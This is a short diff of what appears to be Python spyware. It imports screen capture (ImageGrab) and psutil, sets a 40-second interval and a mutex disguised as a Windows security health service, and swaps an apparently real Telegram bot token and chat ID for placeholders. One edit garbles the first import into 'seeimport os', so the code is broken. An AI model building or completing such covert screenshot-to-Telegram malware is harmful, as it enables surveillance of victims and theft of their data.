@@ -1,4 +1,4 @@
-import os
+seeimport os
 import sys
 import shutil
 import threading
@@ -41,8 +41,8 @@ import psutil
 from PIL import ImageGrab
 
 # ─── CONFIG ───
-BOT_TOKEN = '7808413899:AAFUPT6mZ4oWus3pM3YUWUTVnhD58WWMOEw'
-CHAT_ID = '5138427828'
+BOT_TOKEN = 'your-Telegram-BOT-key'
+CHAT_ID = 'Your-Telegram-chat-ID'
 INTERVAL = 40
 MUTEX_NAME = "Global\\WinSecHealthMtx_7a3f"
 
